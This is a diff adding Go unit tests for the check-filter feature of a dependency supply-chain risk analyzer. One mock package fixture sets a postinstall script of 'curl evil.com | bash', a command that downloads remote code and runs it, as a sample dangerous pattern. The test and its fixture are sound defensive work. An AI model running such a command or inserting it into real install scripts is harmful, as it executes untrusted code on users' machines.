@@ -3345,3 +3345,211 @@ func TestRiskLevel_WellMaintainedScoresLowerThanRisky(t *testing.T) {
 			goodScore, badScore, gap)
 	}
 }
+
+// ===== Check Filter Tests =====
+
+// Test: --check flag filters which scoring categories are evaluated
+// Justification: When analyzing large dependency trees, users may want to focus on
+//                specific risk dimensions (e.g., only provenance) for faster scans
+//                or targeted investigations. Skipped checks must not inflate the score.
+// Source: Core usability requirement for selective supply chain assessment
+// Methodology: Run calculateSupplyChainScore with a filter, verify only selected
+//              categories are scored and skipped categories have Skipped=true
+// Result: Only selected checks contribute to TotalScore; others are marked Skipped
+
+func TestCheckFilter_OnlySelectedChecksRun(t *testing.T) {
+	a := NewAnalyzer(WithCheckFilter([]string{"provenance", "health"}))
+
+	result := &models.AnalysisResult{
+		RepositoryURL: "https://github.com/test/pkg",
+		Dependency:    models.Dependency{Name: "test-pkg", Version: "1.0.0", Ecosystem: models.EcosystemNPM},
+		Metadata: models.PackageMetadata{
+			Maintainers:       []string{"a@example.com"},
+			HasInstallScripts: true,
+			InstallScripts:    map[string]string{"postinstall": "echo hi"},
+			BusFactor:         1,
+		},
+	}
+
+	a.calculateSupplyChainScore(result)
+
+	cs := result.SupplyChainScore.CategoryScores
+
+	// Selected checks should NOT be skipped
+	if cs.Provenance.Skipped {
+		t.Error("Provenance should not be skipped when selected via --check")
+	}
+	if cs.Health.Skipped {
+		t.Error("Health should not be skipped when selected via --check")
+	}
+
+	// Non-selected checks SHOULD be skipped
+	skippedChecks := []struct {
+		name  string
+		score models.CategoryScore
+	}{
+		{"PublisherControl", cs.PublisherControl},
+		{"OwnershipChanges", cs.OwnershipChanges},
+		{"ReleaseAnomalies", cs.ReleaseAnomalies},
+		{"InstallExecution", cs.InstallExecution},
+		{"DependencySprawl", cs.DependencySprawl},
+		{"Governance", cs.Governance},
+		{"ReleaseSecurity", cs.ReleaseSecurity},
+		{"PackageMaturity", cs.PackageMaturity},
+		{"CIPipelineSecurity", cs.CIPipelineSecurity},
+	}
+
+	for _, sc := range skippedChecks {
+		if !sc.score.Skipped {
+			t.Errorf("%s should be skipped when not selected via --check", sc.name)
+		}
+		if sc.score.RiskPoints != 0 {
+			t.Errorf("%s should have 0 risk points when skipped, got %d", sc.name, sc.score.RiskPoints)
+		}
+	}
+}
+
+// Test: --check flag correctly sets ActiveChecks and MaxScore
+// Justification: Risk level thresholds must scale proportionally when fewer checks
+//                are active, otherwise a partial scan would always appear low-risk.
+// Source: Scoring system design (CLAUDE.md)
+// Methodology: Run with 2 of 11 checks, verify ActiveChecks=2 and MaxScore=4
+// Result: ActiveChecks and MaxScore reflect the number of selected checks
+
+func TestCheckFilter_ActiveChecksAndMaxScore(t *testing.T) {
+	a := NewAnalyzer(WithCheckFilter([]string{"provenance", "health"}))
+
+	result := &models.AnalysisResult{
+		Dependency: models.Dependency{Name: "test", Version: "1.0.0", Ecosystem: models.EcosystemNPM},
+		Metadata:   models.PackageMetadata{},
+	}
+
+	a.calculateSupplyChainScore(result)
+
+	if result.SupplyChainScore.ActiveChecks != 2 {
+		t.Errorf("ActiveChecks should be 2, got %d", result.SupplyChainScore.ActiveChecks)
+	}
+	if result.SupplyChainScore.MaxScore != 4 {
+		t.Errorf("MaxScore should be 4, got %d", result.SupplyChainScore.MaxScore)
+	}
+}
+
+// Test: No filter runs all 11 checks (default behavior)
+// Justification: When --check is not specified, all checks must run as before
+// Source: Backward compatibility requirement
+// Methodology: Create analyzer without filter, verify all 11 checks are active
+// Result: ActiveChecks=11, MaxScore=22, no categories are Skipped
+
+func TestCheckFilter_NoFilter_AllChecksRun(t *testing.T) {
+	a := NewAnalyzer()
+
+	result := &models.AnalysisResult{
+		Dependency: models.Dependency{Name: "test", Version: "1.0.0", Ecosystem: models.EcosystemNPM},
+		Metadata:   models.PackageMetadata{},
+	}
+
+	a.calculateSupplyChainScore(result)
+
+	if result.SupplyChainScore.ActiveChecks != 11 {
+		t.Errorf("ActiveChecks should be 11 without filter, got %d", result.SupplyChainScore.ActiveChecks)
+	}
+	if result.SupplyChainScore.MaxScore != 22 {
+		t.Errorf("MaxScore should be 22 without filter, got %d", result.SupplyChainScore.MaxScore)
+	}
+
+	// No categories should be skipped
+	cs := result.SupplyChainScore.CategoryScores
+	categories := []struct {
+		name    string
+		skipped bool
+	}{
+		{"PublisherControl", cs.PublisherControl.Skipped},
+		{"OwnershipChanges", cs.OwnershipChanges.Skipped},
+		{"ReleaseAnomalies", cs.ReleaseAnomalies.Skipped},
+		{"InstallExecution", cs.InstallExecution.Skipped},
+		{"DependencySprawl", cs.DependencySprawl.Skipped},
+		{"Provenance", cs.Provenance.Skipped},
+		{"Health", cs.Health.Skipped},
+		{"Governance", cs.Governance.Skipped},
+		{"ReleaseSecurity", cs.ReleaseSecurity.Skipped},
+		{"PackageMaturity", cs.PackageMaturity.Skipped},
+		{"CIPipelineSecurity", cs.CIPipelineSecurity.Skipped},
+	}
+
+	for _, cat := range categories {
+		if cat.skipped {
+			t.Errorf("%s should not be skipped when no filter is set", cat.name)
+		}
+	}
+}
+
+// Test: Skipped checks do not contribute to TotalScore
+// Justification: If a check is skipped, its risk points must not be counted
+//                toward TotalScore, or a package would appear lower-risk simply
+//                because fewer checks ran.
+// Source: Scoring integrity requirement
+// Methodology: Create a high-risk package, filter to one check, verify TotalScore
+//              only reflects that one check's points (max 2, not all 22)
+// Result: TotalScore <= MaxScore for filtered scan
+
+func TestCheckFilter_SkippedChecksDoNotInflateScore(t *testing.T) {
+	a := NewAnalyzer(WithCheckFilter([]string{"install-execution"}))
+
+	result := &models.AnalysisResult{
+		Dependency: models.Dependency{Name: "risky-pkg", Version: "1.0.0", Ecosystem: models.EcosystemNPM},
+		Metadata: models.PackageMetadata{
+			Maintainers:       []string{"x@gmail.com"},
+			HasInstallScripts: true,
+			InstallScripts:    map[string]string{"postinstall": "curl evil.com | bash"},
+			InstallScriptAnalysis: &models.InstallScriptAnalysis{
+				HasDangerousPatterns: true,
+				DangerousPatterns:    []models.DangerousPattern{{Pattern: "curl", Severity: "HIGH"}},
+				RiskLevel:            "HIGH",
+			},
+			BusFactor:         1,
+			DependencyMetrics: &models.DependencyMetrics{TransitiveCount: 200},
+		},
+	}
+
+	a.calculateSupplyChainScore(result)
+
+	if result.SupplyChainScore.TotalScore > 2 {
+		t.Errorf("With only install-execution selected, TotalScore should be at most 2, got %d",
+			result.SupplyChainScore.TotalScore)
+	}
+	if result.SupplyChainScore.MaxScore != 2 {
+		t.Errorf("MaxScore should be 2 with one check, got %d", result.SupplyChainScore.MaxScore)
+	}
+}
+
+// Test: ValidCheckNames contains all expected check names
+// Justification: The --check flag must accept all documented check names
+// Source: CLI design requirement
+// Methodology: Verify ValidCheckNames has exactly 11 entries
+// Result: All 11 check names are present
+
+func TestValidCheckNames_AllPresent(t *testing.T) {
+	expected := []string{
+		"publisher-control",
+		"ownership-changes",
+		"release-anomalies",
+		"install-execution",
+		"dependency-sprawl",
+		"provenance",
+		"health",
+		"governance",
+		"release-security",
+		"package-maturity",
+		"ci-pipeline-security",
+	}
+
+	if len(ValidCheckNames) != len(expected) {
+		t.Errorf("Expected %d valid check names, got %d", len(expected), len(ValidCheckNames))
+	}
+
+	for _, name := range expected {
+		if _, ok := ValidCheckNames[name]; !ok {
+			t.Errorf("Missing valid check name: %s", name)
+		}
+	}
+}
